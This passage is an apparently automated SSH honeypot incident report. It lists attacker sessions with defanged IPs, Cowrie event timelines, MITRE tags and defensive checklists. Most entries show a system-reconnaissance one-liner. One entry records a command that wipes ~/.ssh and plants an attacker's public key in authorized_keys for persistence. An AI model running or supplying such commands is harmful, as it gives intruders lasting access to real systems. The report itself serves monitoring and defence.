- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e850fd4f31c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:41 |
| **Last Seen** | 2026-07-04 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:41:42` | `cowrie.session.connect` |
| `2026-07-04 03:41:42` | `cowrie.client.version` |
| `2026-07-04 03:41:42` | `cowrie.client.kex` |
| `2026-07-04 03:41:42` | `cowrie.login.success` |
| `2026-07-04 03:41:43` | `cowrie.session.params` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.success` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.command.input` |
| `2026-07-04 03:41:43` | `cowrie.log.closed` |
| `2026-07-04 03:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fe7f8360ca7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:42 |
| **Last Seen** | 2026-07-04 03:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:42:04` | `cowrie.session.connect` |
| `2026-07-04 03:42:05` | `cowrie.client.version` |
| `2026-07-04 03:42:05` | `cowrie.client.kex` |
| `2026-07-04 03:42:05` | `cowrie.login.success` |
| `2026-07-04 03:42:06` | `cowrie.session.params` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.success` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.command.input` |
| `2026-07-04 03:42:06` | `cowrie.log.closed` |
| `2026-07-04 03:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c6946f6ca3

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-04 03:42 |
| **Last Seen** | 2026-07-04 03:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:42:59` | `cowrie.session.connect` |
| `2026-07-04 03:42:59` | `cowrie.client.version` |
| `2026-07-04 03:42:59` | `cowrie.client.kex` |
| `2026-07-04 03:43:00` | `cowrie.login.success` |
| `2026-07-04 03:43:02` | `cowrie.session.params` |
| `2026-07-04 03:43:02` | `cowrie.command.input` |
| `2026-07-04 03:43:02` | `cowrie.command.failed` |
| `2026-07-04 03:43:02` | `cowrie.log.closed` |
| `2026-07-04 03:43:03` | `cowrie.session.params` |
| `2026-07-04 03:43:03` | `cowrie.command.input` |
| `2026-07-04 03:43:04` | `cowrie.session.file_download` |
| `2026-07-04 03:43:04` | `cowrie.log.closed` |
| `2026-07-04 03:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f704719af6

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-04 03:43 |
| **Last Seen** | 2026-07-04 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:43:04` | `cowrie.session.connect` |
| `2026-07-04 03:43:04` | `cowrie.client.version` |
| `2026-07-04 03:43:04` | `cowrie.client.kex` |
| `2026-07-04 03:43:05` | `cowrie.login.success` |
| `2026-07-04 03:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bafc48ad6c1

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-04 03:43 |
| **Last Seen** | 2026-07-04 03:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:43:06` | `cowrie.session.connect` |
| `2026-07-04 03:43:06` | `cowrie.client.version` |
| `2026-07-04 03:43:06` | `cowrie.client.kex` |
| `2026-07-04 03:43:08` | `cowrie.login.success` |
| `2026-07-04 03:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b74f3b319ec1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:44 |
| **Last Seen** | 2026-07-04 03:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:44:00` | `cowrie.session.connect` |
| `2026-07-04 03:44:00` | `cowrie.client.version` |
| `2026-07-04 03:44:00` | `cowrie.client.kex` |
| `2026-07-04 03:44:01` | `cowrie.login.success` |
| `2026-07-04 03:44:02` | `cowrie.session.params` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.success` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.command.input` |
| `2026-07-04 03:44:02` | `cowrie.log.closed` |
| `2026-07-04 03:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faac30f60a81

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 03:44 |
| **Last Seen** | 2026-07-04 03:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:44:04` | `cowrie.session.connect` |
| `2026-07-04 03:44:06` | `cowrie.client.version` |
| `2026-07-04 03:44:06` | `cowrie.client.kex` |
| `2026-07-04 03:44:12` | `cowrie.login.success` |
| `2026-07-04 03:44:16` | `cowrie.session.params` |
| `2026-07-04 03:44:16` | `cowrie.command.input` |
| `2026-07-04 03:44:18` | `cowrie.log.closed` |
| `2026-07-04 03:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f17e552dcbc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:46 |
| **Last Seen** | 2026-07-04 03:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:46:08` | `cowrie.session.connect` |
| `2026-07-04 03:46:08` | `cowrie.client.version` |
| `2026-07-04 03:46:08` | `cowrie.client.kex` |
| `2026-07-04 03:46:09` | `cowrie.login.success` |
| `2026-07-04 03:46:10` | `cowrie.session.params` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.success` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.command.input` |
| `2026-07-04 03:46:10` | `cowrie.log.closed` |
| `2026-07-04 03:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6888b987e63

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]121` |
| **First Seen** | 2026-07-04 03:46 |
| **Last Seen** | 2026-07-04 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:46:55` | `cowrie.session.connect` |
| `2026-07-04 03:46:55` | `cowrie.client.version` |
| `2026-07-04 03:46:55` | `cowrie.client.kex` |
| `2026-07-04 03:46:55` | `cowrie.login.success` |
| `2026-07-04 03:46:55` | `cowrie.direct-tcpip.request` |
| `2026-07-04 03:46:55` | `cowrie.direct-tcpip.data` |
| `2026-07-04 03:46:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]121` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ebef8ec91a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:48 |
| **Last Seen** | 2026-07-04 03:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:48:13` | `cowrie.session.connect` |
| `2026-07-04 03:48:14` | `cowrie.client.version` |
| `2026-07-04 03:48:14` | `cowrie.client.kex` |
| `2026-07-04 03:48:14` | `cowrie.login.success` |
| `2026-07-04 03:48:15` | `cowrie.session.params` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.success` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:15` | `cowrie.command.input` |
| `2026-07-04 03:48:16` | `cowrie.log.closed` |
| `2026-07-04 03:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f3d188ccac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]7` |
| **First Seen** | 2026-07-04 03:48 |
| **Last Seen** | 2026-07-04 03:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:48:48` | `cowrie.session.connect` |
| `2026-07-04 03:48:48` | `cowrie.client.version` |
| `2026-07-04 03:48:48` | `cowrie.client.kex` |
| `2026-07-04 03:48:48` | `cowrie.login.success` |
| `2026-07-04 03:48:49` | `cowrie.session.params` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.success` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.command.input` |
| `2026-07-04 03:48:49` | `cowrie.log.closed` |
| `2026-07-04 03:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b62c18a114

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]121` |
| **First Seen** | 2026-07-04 03:49 |
| **Last Seen** | 2026-07-04 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:49:47` | `cowrie.session.connect` |
| `2026-07-04 03:49:47` | `cowrie.client.version` |
| `2026-07-04 03:49:47` | `cowrie.client.kex` |
| `2026-07-04 03:49:48` | `cowrie.login.success` |
| `2026-07-04 03:49:48` | `cowrie.direct-tcpip.request` |
| `2026-07-04 03:49:48` | `cowrie.direct-tcpip.data` |
| `2026-07-04 03:49:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]121` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c76b22af9e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:50 |
| **Last Seen** | 2026-07-04 03:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:50:19` | `cowrie.session.connect` |
| `2026-07-04 03:50:19` | `cowrie.client.version` |
| `2026-07-04 03:50:19` | `cowrie.client.kex` |
| `2026-07-04 03:50:20` | `cowrie.login.success` |
| `2026-07-04 03:50:21` | `cowrie.session.params` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.success` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.command.input` |
| `2026-07-04 03:50:21` | `cowrie.log.closed` |
| `2026-07-04 03:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6570b061d606

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:52 |
| **Last Seen** | 2026-07-04 03:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:52:32` | `cowrie.session.connect` |
| `2026-07-04 03:52:32` | `cowrie.client.version` |
| `2026-07-04 03:52:32` | `cowrie.client.kex` |
| `2026-07-04 03:52:33` | `cowrie.login.success` |
| `2026-07-04 03:52:34` | `cowrie.session.params` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.success` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.command.input` |
| `2026-07-04 03:52:34` | `cowrie.log.closed` |
| `2026-07-04 03:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23a76811bd3f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-04 03:54 |
| **Last Seen** | 2026-07-04 03:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 03:54:54` | `cowrie.session.connect` |
| `2026-07-04 03:54:54` | `cowrie.client.version` |
| `2026-07-04 03:54:54` | `cowrie.client.kex` |
| `2026-07-04 03:54:55` | `cowrie.login.success` |
| `2026-07-04 03:54:56` | `cowrie.session.params` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.success` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
| `2026-07-04 03:54:56` | `cowrie.command.input` |
